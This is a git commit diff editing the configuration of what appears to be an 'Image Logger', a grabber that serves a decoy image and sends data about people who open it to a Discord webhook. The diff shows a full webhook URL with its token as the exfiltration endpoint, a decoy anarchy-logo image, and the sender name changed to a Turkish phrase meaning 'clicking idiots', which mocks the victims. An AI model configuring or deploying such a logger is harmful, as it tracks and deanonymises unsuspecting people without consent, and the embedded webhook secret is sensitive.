f301d2102520e5da49fad2dd850b6cf2bdb0395a
zeinkoax <efebaygeldi571@gmail.com>
2025-01-31 09:23:42 +0300

    image.py

--- api/image.py
+++ api/image.py
@@ -15,10 +15,10 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1334725726196207676/-aJr8AXeQGaoA2QYpRibXS0qaBQuki84-XdlkQ9P2pA4i6tD2nxVPRaSO_NJD1wHkxCo",
     "image": "https://w7.pngwing.com/pngs/919/558/png-transparent-drawing-anarchy-logo-anarchy-bicycle-part-anarchism-line.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Tıklayan Salaklar", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
